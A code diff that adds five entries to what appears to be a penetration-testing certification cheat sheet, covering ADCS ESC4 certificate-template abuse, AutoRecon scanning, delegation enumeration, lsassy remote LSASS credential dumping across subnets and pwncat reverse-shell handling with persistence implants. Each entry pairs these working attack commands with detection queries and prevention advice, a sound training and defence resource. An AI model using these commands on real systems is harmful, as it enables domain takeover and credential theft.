@@ -5161,6 +5161,106 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc4-template-modify",
+      "name": "ADCS ESC4 - Certificate Template Modification",
+      "command": "modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -add enrollee_supplies_subject -dc-ip <dc_ip>",
+      "description": "ESC4 exploits write access (GenericWrite/WriteDACL/WriteProperty) to a certificate template. An attacker modifies the template to enable Subject Alternative Name (SAN), turning it into an ESC1-vulnerable template, then requests a certificate impersonating a Domain Admin.",
+      "platform": "linux",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps Certified Pre-Owned; CRTP ADCS module",
+      "tags": [
+        "adcs",
+        "esc4",
+        "template-modification",
+        "writeproperty",
+        "san",
+        "certificate-template"
+      ],
+      "mitre": [
+        "T1649"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONDITIONS ===\n1. User has write access to a certificate template\n   (GenericWrite, WriteDACL, WriteProperty, WriteOwner)\n2. The template is published on a CA\n3. Template allows client authentication EKU\n\n=== FIND WRITABLE TEMPLATES ===\n  certipy find -u <user>@<domain> -p <pass> -dc-ip <dc_ip> -vulnerable -stdout\n  # Look for ESC4 in output\n  # Or check ACLs manually with PowerView:\n  Get-ADObject -Filter {objectClass -eq \"pKICertificateTemplate\"} | ForEach-Object {\n    Get-Acl \"AD:\\$($_.DistinguishedName)\" | Select-Object -ExpandProperty Access\n  }\n\n=== ATTACK CHAIN ===\n  # Step 1: Save original template (for cleanup)\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -get-acl -dc-ip <dc_ip>\n\n  # Step 2: Modify template to allow SAN\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -add enrollee_supplies_subject -dc-ip <dc_ip>\n\n  # Step 3: Request cert with SAN (now ESC1)\n  certipy req -u <user>@<domain> -p <pass> -ca <ca_name> -template <vuln_template> -upn administrator@<domain> -dc-ip <dc_ip>\n\n  # Step 4: Authenticate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n  # Step 5: CLEANUP - restore template\n  modifyCertTemplate.py <domain>/<user>:<pass> -template <vuln_template> -remove enrollee_supplies_subject -dc-ip <dc_ip>\n\n=== ALTERNATIVE: ADCSTemplate ===\n  # PowerShell:\n  Set-ADCSTemplate -DisplayName <template> -Identity <domain>\\<user> -Setting enrollee_supplies_subject",
+      "examples": [
+        {
+          "label": "Find writable templates",
+          "command": "certipy find -u jdoe@corp.local -p Password123 -dc-ip 192.168.1.10 -vulnerable -stdout"
+        },
+        {
+          "label": "Enable SAN on template",
+          "command": "modifyCertTemplate.py corp.local/jdoe:Password123 -template VulnTemplate -add enrollee_supplies_subject -dc-ip 192.168.1.10"
+        },
+        {
+          "label": "Request cert as admin",
+          "command": "certipy req -u jdoe@corp.local -p Password123 -ca corp-CA -template VulnTemplate -upn administrator@corp.local -dc-ip 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "SpecterOps - Certified Pre-Owned",
+          "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+        },
+        {
+          "title": "modifyCertTemplate",
+          "url": "https://github.com/fortalice/modifyCertTemplate"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-esc1-certipy-linux",
+          "note": "ESC1 is what the template becomes after ESC4 modification.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-adcs-esc2-any-purpose",
+          "note": "ESC2 is another template misconfiguration (Any Purpose EKU).",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Certificate templates are AD objects with ACLs. If a user has write access, they can modify the template properties to enable Subject Alternative Name, which allows requesting certificates for any user.",
+        "prerequisites": "Write access (GenericWrite/WriteDACL/WriteProperty) to a published certificate template.",
+        "impact": "Domain compromise by impersonating Domain Admin via modified certificate template.",
+        "detection": "[MITRE T1649] Certificate template modification events; template ACL changes; enrollment after template change.",
+        "artifacts": "Event 4899 (template modified); LDAP writes to pKICertificateTemplate objects; certificate request shortly after template change.",
+        "splunk_spl": "index=windows EventCode=5136 ObjectClass=\"pKICertificateTemplate\"\n| where AttributeLDAPDisplayName IN (\"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\")\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "elastic_kql": "event.code:\"5136\" AND winlog.event_data.ObjectClass:\"pKICertificateTemplate\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"pKICertificateTemplate\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+        "sigma_rules": "win_security_adcs_esc4_template_modification",
+        "prevention": "Restrict write access to certificate templates; monitor template modifications; use template version tracking; alert on any template property changes.",
+        "sources": [
+          "SpecterOps research",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "ESC4 - Certificate template modification",
+            "logic": "SecurityEvent\n| where EventID == 5136\n| where ObjectClass == \"pKICertificateTemplate\"\n| where AttributeLDAPDisplayName has_any (\"msPKI-Certificate-Name-Flag\", \"msPKI-Enrollment-Flag\", \"msPKI-RA-Signature\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, AttributeValue",
+            "data_source": "windows-security",
+            "log_ids": [
+              "5136"
+            ],
+            "attack": [
+              "T1649"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate PKI administrator template changes",
+            "tuning": "Any non-PKI-admin modifying certificate template flags is extremely suspicious"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adcs-esc6-editf-flag",
       "name": "ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse",
       "command": "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template User -upn administrator@<domain>",
@@ -10260,6 +10360,102 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Forces a remote machine (often a DC) to authenticate to a host you control:\n  MS-RPRN.exe               trigger the Print System 'printerbug' RPC (RpcRemoteFindFirstPrinterChangeNotification)\n  \\\\<target_dc_fqdn>       the victim you coerce (it will authenticate outbound)\n  \\\\<listener_host_fqdn>   where it authenticates TO - your listener\nPoint it at an unconstrained-delegation host running Rubeus monitor to capture the DC's TGT, or at ntlmrelayx to relay. DFSCoerce/WSPCoerce are alternatives when the print service is disabled."
+    },
+    {
+      "id": "recon-autorecon",
+      "name": "AutoRecon - Automated Multi-Tool Reconnaissance",
+      "command": "autorecon <target>",
+      "description": "AutoRecon automates the full reconnaissance workflow: port scanning, service enumeration, and service-specific scripts. Runs nmap, then triggers targeted tools per service (gobuster for HTTP, enum4linux for SMB, etc.). Saves all output in organized directories. The OSCP exam time-saver.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Reconnaissance",
+      "subcategory": "Automated Scanning",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "Tib3rius/AutoRecon; OSCP methodology",
+      "tags": [
+        "autorecon",
+        "automated-recon",
+        "nmap",
+        "enumeration",
+        "oscp-exam",
+        "multi-tool"
+      ],
+      "mitre": [
+        "T1046"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip install autorecon\n  # Or:\n  git clone https://github.com/Tib3rius/AutoRecon\n  pip install -r requirements.txt\n\n=== BASIC USAGE ===\n  autorecon <target>\n  autorecon 10.10.10.100\n  autorecon -t targets.txt\n  # Multiple targets:\n  autorecon 10.10.10.100 10.10.10.101 10.10.10.102\n\n=== OPTIONS ===\n  autorecon <target> --single-target     # One target at a time\n  autorecon <target> -o ./results        # Output directory\n  autorecon <target> --nmap-append=\"-Pn\" # Add nmap flags\n  autorecon <target> --only-scans-dir    # Only create scans directory\n\n=== OUTPUT STRUCTURE ===\n  results/<target>/\n    scans/\n      _quick_tcp_nmap.txt     # Initial fast scan\n      _full_tcp_nmap.txt      # Full port scan\n      tcp80/                  # Per-service results\n        gobuster.txt\n        nikto.txt\n      tcp445/\n        enum4linux.txt\n        smbmap.txt\n    exploit/                  # Place exploits here\n    loot/                     # Place found creds/files here\n\n=== OSCP EXAM WORKFLOW ===\n  # Start AutoRecon on all targets immediately:\n  autorecon 10.10.10.100 10.10.10.101 10.10.10.102 10.10.10.103 10.10.10.104\n  # Review results as they come in\n  # Focus manual testing on interesting findings",
+      "examples": [
+        {
+          "label": "Scan single target",
+          "command": "autorecon 10.10.10.100"
+        },
+        {
+          "label": "Scan multiple targets",
+          "command": "autorecon 10.10.10.100 10.10.10.101 10.10.10.102"
+        },
+        {
+          "label": "Custom output with nmap flags",
+          "command": "autorecon 10.10.10.100 -o ./results --nmap-append=\"-Pn\""
+        }
+      ],
+      "references": [
+        {
+          "title": "AutoRecon",
+          "url": "https://github.com/Tib3rius/AutoRecon"
+        },
+        {
+          "title": "MITRE T1046",
+          "url": "https://attack.mitre.org/techniques/T1046/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-masscan",
+          "note": "Masscan for fast initial port discovery before detailed scans.",
+          "rel": "prereq"
+        },
+        {
+          "id": "nmap-full-version-scan",
+          "note": "Manual nmap for targeted follow-up scanning.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AutoRecon orchestrates multiple scanning tools (nmap, gobuster, nikto, enum4linux, etc.) against each discovered service, providing comprehensive enumeration in a single command.",
+        "prerequisites": "Root/sudo access; target IP; various scanning tools installed.",
+        "impact": "Complete service enumeration and vulnerability identification across all open ports.",
+        "detection": "[MITRE T1046] High volume of scanning traffic across multiple protocols and ports; sequential tool execution patterns.",
+        "artifacts": "Multiple scan tool signatures in logs; nmap/gobuster/nikto in process list; high connection rates.",
+        "splunk_spl": "index=firewall\n| stats dc(dest_port) as ports, count as connections by src_ip\n| where ports > 50 AND connections > 1000\n| sort -connections",
+        "elastic_kql": "source.ip:<attacker_ip> AND event.action:\"connection_attempted\"",
+        "sentinel_kql": "CommonSecurityLog\n| summarize Ports=dcount(DestinationPort), Connections=count() by SourceIP, bin(TimeGenerated, 5m)\n| where Ports > 50 or Connections > 500",
+        "sigma_rules": "net_automated_reconnaissance_scanning",
+        "prevention": "IDS/IPS rules for scanning signatures; rate limiting; network segmentation; honeypots for early detection.",
+        "sources": [
+          "AutoRecon documentation",
+          "https://attack.mitre.org/techniques/T1046/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Automated multi-tool reconnaissance",
+            "logic": "title: Multi-Tool Automated Reconnaissance\nstatus: experimental\nlogsource:\n  category: firewall\ndetection:\n  selection:\n    action: allow\n  timeframe: 10m\n  condition: selection | count(dst_port) by src_ip > 50\nlevel: high",
+            "data_source": "firewall",
+            "attack": [
+              "T1046"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Authorized vulnerability scanners; penetration testing",
+            "tuning": "Whitelist known scanner IPs; adjust port threshold based on environment"
+          }
+        ]
+      }
     },
     {
       "id": "av-evasion-methods",
@@ -48177,6 +48373,112 @@ const COMMAND_DATA = {
       "explain": "When a server won't execute uploaded files but lets you write to an arbitrary path, upload your own public key as ~/.ssh/authorized_keys (or append to it) to gain SSH access as that user - the clas...:\n  <user>  username to authenticate as\nUse this when the app accepts uploads but the server won't run them (no PHP/ASPX execution), yet you control the write path."
     },
     {
+      "id": "ad-finddelegation",
+      "name": "findDelegation.py - Enumerate AD Delegation Settings",
+      "command": "findDelegation.py <domain>/<user>:<pass> -dc-ip <dc_ip>",
+      "description": "Impacket findDelegation enumerates all delegation settings in Active Directory: unconstrained, constrained, and resource-based constrained delegation. Shows which accounts can impersonate others and to which services. Critical first step before any delegation-based attack (S4U2Self/Proxy, RBCD, printer bug).",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Impacket; HTB machines; CRTP delegation module",
+      "tags": [
+        "finddelegation",
+        "impacket",
+        "delegation",
+        "unconstrained",
+        "constrained",
+        "rbcd",
+        "enumeration"
+      ],
+      "mitre": [
+        "T1087.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  findDelegation.py <domain>/<user>:<pass> -dc-ip <dc_ip>\n  # Shows: AccountName, AccountType, DelegationType, DelegationRightsTo\n\n=== OUTPUT COLUMNS ===\n  # AccountName: The account with delegation\n  # AccountType: User or Computer\n  # DelegationType: Unconstrained, Constrained, Resource-Based Constrained\n  # DelegationRightsTo: Target service(s)\n\n=== WHAT TO LOOK FOR ===\n  # UNCONSTRAINED DELEGATION:\n  #   Computer accounts trusted for delegation to ANY service\n  #   Attack: Coerce auth (PrinterBug/PetitPotam) -> capture TGT\n  # CONSTRAINED DELEGATION:\n  #   Accounts delegated to SPECIFIC services (e.g. CIFS/SQL01)\n  #   Attack: S4U2Self + S4U2Proxy -> impersonate admin to target\n  # RESOURCE-BASED CONSTRAINED (RBCD):\n  #   Target allows specific accounts to delegate TO it\n  #   Attack: Control source account -> impersonate to target\n\n=== ALTERNATIVE TOOLS ===\n  # PowerView:\n  Get-DomainComputer -Unconstrained\n  Get-DomainUser -TrustedToAuth\n  Get-DomainComputer -TrustedToAuth\n  # BloodHound: Check delegation edges\n  # CrackMapExec:\n  crackmapexec ldap <dc_ip> -u <user> -p <pass> --trusted-for-delegation",
+      "examples": [
+        {
+          "label": "Enumerate all delegation",
+          "command": "findDelegation.py corp.local/jdoe:Password123 -dc-ip 192.168.1.10"
+        },
+        {
+          "label": "With Kerberos auth",
+          "command": "findDelegation.py corp.local/jdoe -k -no-pass -dc-ip 192.168.1.10"
+        },
+        {
+          "label": "Alternative CrackMapExec",
+          "command": "crackmapexec ldap 192.168.1.10 -u jdoe -p Password123 --trusted-for-delegation"
+        }
+      ],
+      "references": [
+        {
+          "title": "Impacket",
+          "url": "https://github.com/fortra/impacket"
+        },
+        {
+          "title": "MITRE T1087.002",
+          "url": "https://attack.mitre.org/techniques/T1087/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-impacket-rbcd",
+          "note": "RBCD attack after finding resource-based delegation targets.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-s4u2self-abuse",
+          "note": "S4U2Self/Proxy attack after finding constrained delegation.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-krbrelayx",
+          "note": "Exploit unconstrained delegation via Kerberos relay.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Delegation settings are stored in AD attributes (userAccountControl, msDS-AllowedToDelegateTo, msDS-AllowedToActOnBehalfOfOtherIdentity) readable by any authenticated user.",
+        "prerequisites": "Any domain user credentials; LDAP access to DC.",
+        "impact": "Identifies all delegation attack paths in the domain.",
+        "detection": "[MITRE T1087.002] LDAP queries for delegation attributes; bulk AD enumeration.",
+        "artifacts": "LDAP queries for userAccountControl with delegation flags; msDS-AllowedToDelegateTo lookups.",
+        "splunk_spl": "index=windows EventCode=1644 (SearchFilter=\"*userAccountControl*\" OR SearchFilter=\"*msDS-AllowedToDelegateTo*\")\n| table _time, SubjectUserName, SearchFilter",
+        "elastic_kql": "event.code:\"1644\" AND winlog.event_data.SearchFilter:(*AllowedToDelegate* OR *TrustedForDelegation*)",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 1644\n| where SearchFilter has_any (\"AllowedToDelegateTo\", \"TrustedForDelegation\", \"AllowedToActOnBehalf\")\n| project TimeGenerated, SubjectUserName, SearchFilter",
+        "sigma_rules": "win_ldap_delegation_enumeration",
+        "prevention": "Minimize delegation configurations; use Protected Users group; monitor delegation attribute queries; audit delegation settings regularly.",
+        "sources": [
+          "Impacket",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "AD delegation enumeration via LDAP",
+            "logic": "SecurityEvent\n| where EventID == 1644\n| where SearchFilter has_any (\"msDS-AllowedToDelegateTo\", \"TrustedForDelegation\", \"AllowedToActOnBehalf\")\n| project TimeGenerated, SubjectUserName, ClientIP=IpAddress, SearchFilter",
+            "data_source": "windows-security",
+            "log_ids": [
+              "1644"
+            ],
+            "attack": [
+              "T1087.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "BloodHound/SharpHound enumeration; legitimate AD administration tools",
+            "tuning": "Alert on non-admin accounts querying delegation attributes"
+          }
+        ]
+      }
+    },
+    {
       "id": "firefox-decrypt",
       "name": "Firefox - Decrypt Saved Logins",
       "command": "python3 firefox_decrypt.py",
@@ -82550,6 +82852,104 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Detect credential dumping from LSASS memory using Sysmon Event ID 10 (ProcessAccess).\nTools like Mimikatz open a handle to lsass.exe with specific access rights - Sysmon captures this handle request and records the calling process, enabling detection."
+    },
+    {
+      "id": "post-lsassy",
+      "name": "lsassy - Remote LSASS Credential Extraction",
+      "command": "lsassy -d <domain> -u <user> -p <pass> <target>",
+      "description": "lsassy remotely dumps LSASS credentials from Windows hosts without uploading tools to the target. Uses multiple dump methods (comsvcs, procdump, nanodump, etc.) and parses the dump in memory. Can be combined with CrackMapExec for mass credential harvesting across multiple hosts.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Credential Access",
+      "certifications": [
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Hackndo/lsassy",
+      "tags": [
+        "lsassy",
+        "lsass",
+        "credential-dump",
+        "remote",
+        "ntlm",
+        "pypykatz",
+        "crackmapexec"
+      ],
+      "mitre": [
+        "T1003.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC USAGE ===\n  lsassy -d <domain> -u <user> -p <pass> <target>\n  # Pass-the-hash:\n  lsassy -d <domain> -u <user> -H <nthash> <target>\n\n=== DUMP METHODS ===\n  lsassy -d <domain> -u <user> -p <pass> <target> -m comsvcs    # comsvcs.dll (default)\n  lsassy -d <domain> -u <user> -p <pass> <target> -m procdump   # ProcDump (needs upload)\n  lsassy -d <domain> -u <user> -p <pass> <target> -m nanodump   # nanodump (stealthier)\n  lsassy -d <domain> -u <user> -p <pass> <target> -m dumpert    # Dumpert (direct syscalls)\n\n=== MASS CREDENTIAL HARVESTING ===\n  # Multiple targets:\n  lsassy -d <domain> -u <user> -p <pass> <target1> <target2> <target3>\n  # Subnet:\n  lsassy -d <domain> -u <user> -p <pass> 10.10.10.0/24\n\n=== CRACKMAPEXEC MODULE ===\n  crackmapexec smb <target> -u <user> -p <pass> -M lsassy\n  # Mass spray:\n  crackmapexec smb 10.10.10.0/24 -u admin -p Password123 -M lsassy\n\n=== OUTPUT ===\n  # Shows: domain, username, password/NT hash for each logged-on user\n  # JSON output:\n  lsassy -d <domain> -u <user> -p <pass> <target> --format json -o creds.json",
+      "examples": [
+        {
+          "label": "Remote LSASS dump",
+          "command": "lsassy -d corp.local -u admin -p Password123 10.10.10.100"
+        },
+        {
+          "label": "Mass credential harvest",
+          "command": "lsassy -d corp.local -u admin -p Password123 10.10.10.0/24"
+        },
+        {
+          "label": "Via CrackMapExec",
+          "command": "crackmapexec smb 10.10.10.0/24 -u admin -p Password123 -M lsassy"
+        }
+      ],
+      "references": [
+        {
+          "title": "lsassy",
+          "url": "https://github.com/Hackndo/lsassy"
+        },
+        {
+          "title": "MITRE T1003.001",
+          "url": "https://attack.mitre.org/techniques/T1003/001/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "post-procdump-lsass",
+          "note": "Local LSASS dump when you have a shell on the target.",
+          "rel": "alternative"
+        },
+        {
+          "id": "sedebug-lsass-dump",
+          "note": "Manual LSASS dump methods.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "lsassy connects via SMB with admin credentials, remotely triggers an LSASS memory dump using built-in tools (comsvcs.dll), downloads the dump, and parses it locally. The dump file is deleted from the target after download.",
+        "prerequisites": "Local admin credentials on target; SMB access (port 445).",
+        "impact": "Plaintext passwords and NTLM hashes for all logged-on users across multiple hosts.",
+        "detection": "[MITRE T1003.001] Remote SMB connection followed by LSASS dump; comsvcs.dll execution via remote service.",
+        "artifacts": "SMB admin logon; remote service creation; comsvcs.dll MiniDump; temp dump files.",
+        "splunk_spl": "index=windows (EventCode=4624 LogonType=3 TargetUserName!=\"*$\") AND earliest=-5m (EventCode=4688 CommandLine=\"*comsvcs*MiniDump*\")\n| table _time, IpAddress, TargetUserName, CommandLine",
+        "elastic_kql": "event.code:\"4688\" AND process.args:(*comsvcs* AND *MiniDump*)",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName == \"rundll32.exe\" and ProcessCommandLine has_all (\"comsvcs\", \"MiniDump\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma_rules": "win_process_creation_lsassy_remote_dump",
+        "prevention": "Enable Credential Guard; LSA protection (RunAsPPL); restrict local admin access; monitor for remote comsvcs.dll execution.",
+        "sources": [
+          "Hackndo/lsassy",
+          "https://attack.mitre.org/techniques/T1003/001/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Remote LSASS dump via lsassy/comsvcs",
+            "logic": "DeviceProcessEvents\n| where FileName == \"rundll32.exe\"\n| where ProcessCommandLine has_all (\"comsvcs\", \"MiniDump\")\n| join kind=inner (\n  SecurityEvent | where EventID == 4624 and LogonType == 3\n) on $left.DeviceName == $right.Computer\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, IpAddress",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1003.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate remote crash dump collection (extremely rare)",
+            "tuning": "Any remote-triggered comsvcs MiniDump should be treated as malicious"
+          }
+        ]
+      }
     },
     {
       "id": "ad-machineaccountquota",
@@ -124721,6 +125121,98 @@ const COMMAND_DATA = {
       },
       "type": "command",
       "explain": "Tunnels TCP inside ICMP echo packets, for networks that only allow ping outbound:\n  sudo ./ptunnel-ng   needs root to craft raw ICMP\n  -r<pivot_ip>        the remote pivot that forwards the tunneled traffic\n  -R22                forward to port 22 on the far side (SSH)\nRun this as the server on the pivot; the client side then SSHes to the local tunnel port (add -D for SOCKS over the ICMP channel)."
+    },
+    {
+      "id": "post-pwncat",
+      "name": "pwncat-cs - Advanced Reverse Shell Handler",
+      "command": "pwncat-cs -lp <port>",
+      "description": "pwncat-cs is a post-exploitation platform and advanced reverse shell handler. Automatically upgrades shells to fully interactive PTYs, provides built-in enumeration, file transfer, persistence installation, and privilege escalation suggestions. Replaces manual shell upgrading with python pty tricks.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Post-Exploitation",
+      "subcategory": "Shell Handling",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "calebstewart/pwncat",
+      "tags": [
+        "pwncat",
+        "reverse-shell",
+        "shell-handler",
+        "post-exploitation",
+        "pty",
+        "interactive-shell"
+      ],
+      "mitre": [
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip install pwncat-cs\n\n=== LISTEN FOR CONNECTIONS ===\n  pwncat-cs -lp <port>\n  # Or with specific platform:\n  pwncat-cs -lp <port> -m linux\n  pwncat-cs -lp <port> -m windows\n\n=== CONNECT TO BIND SHELL ===\n  pwncat-cs connect://<target>:<port>\n\n=== FEATURES (once connected) ===\n  # Automatic shell upgrade to full PTY\n  # File transfer (no manual base64/nc needed):\n  upload /local/path /remote/path\n  download /remote/path /local/path\n  # Enumeration:\n  run enumerate\n  run enumerate.user\n  run enumerate.file.suid\n  # Persistence:\n  run implant.backdoor_user\n  run implant.pam\n  run implant.authorized_key\n  # Privesc:\n  run escalate.auto\n\n=== KEYBOARD SHORTCUTS ===\n  Ctrl+D: Drop to pwncat prompt (from remote shell)\n  # In pwncat prompt:\n  back: Return to remote shell\n  exit: Close connection\n\n=== VS NETCAT/RLWRAP ===\n  nc -lvnp <port>:      Basic, no features, no PTY\n  rlwrap nc -lvnp <port>: Adds readline, still basic\n  pwncat-cs -lp <port>:  Full PTY, file xfer, enum, persist",
+      "examples": [
+        {
+          "label": "Listen for reverse shell",
+          "command": "pwncat-cs -lp 4444"
+        },
+        {
+          "label": "Connect to bind shell",
+          "command": "pwncat-cs connect://10.10.10.100:4444"
+        },
+        {
+          "label": "Auto-enumerate after connection",
+          "command": "run enumerate"
+        }
+      ],
+      "references": [
+        {
+          "title": "pwncat-cs",
+          "url": "https://github.com/calebstewart/pwncat"
+        },
+        {
+          "title": "pwncat Documentation",
+          "url": "https://pwncat.readthedocs.io/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-sliver-c2",
+          "note": "Sliver for full C2 capability beyond shell handling.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "pwncat receives reverse shell connections and automatically upgrades them using Python pty.spawn or script commands. The full PTY enables tab completion, signal handling, and interactive tool usage.",
+        "prerequisites": "Reverse or bind shell from target; pwncat installed on attacker machine.",
+        "impact": "Fully interactive shell with automated enumeration and persistence capabilities.",
+        "detection": "[MITRE T1059] Reverse shell connections; PTY upgrade commands; automated enumeration activity.",
+        "artifacts": "Outbound connections to attacker IP; python pty.spawn or script commands; automated enumeration patterns.",
+        "splunk_spl": "index=linux sourcetype=syslog (\"python\" AND \"pty\" AND \"spawn\") OR (\"script\" AND \"/dev/null\")\n| table _time, host, user, process, message",
+        "elastic_kql": "process.args:(*pty.spawn* OR *script* AND */dev/null*)",
+        "sentinel_kql": "Syslog\n| where SyslogMessage has_any (\"pty.spawn\", \"script /dev/null\", \"python3 -c\")\n| project TimeGenerated, HostName, SyslogMessage",
+        "sigma_rules": "linux_shell_upgrade_pty_spawn",
+        "prevention": "Monitor for PTY upgrade patterns; restrict outbound connections; EDR detection for shell upgrade commands.",
+        "sources": [
+          "pwncat documentation",
+          "https://attack.mitre.org/techniques/T1059/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Shell upgrade to interactive PTY",
+            "logic": "title: Interactive Shell PTY Upgrade\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    CommandLine|contains:\n      - \"python -c \\\"import pty\"\n      - \"python3 -c \\\"import pty\"\n      - \"script /dev/null\"\n      - \"script -qc /bin/bash\"\n  condition: selection\nlevel: high",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1059"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Developers using script or Python pty for legitimate purposes",
+            "tuning": "Correlate with inbound network connections from unusual sources"
+          }
+        ]
+      }
     },
     {
       "id": "pypykatz-minidump",
@@ -186941,8 +187433,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1047,
-  "buildDate": "2026-11-10T14:11:34.576Z",
+  "totalCommands": 1052,
+  "buildDate": "2026-11-10T15:35:43.299Z",
   "certifications": [
     "CDSA",
     "CPTS",
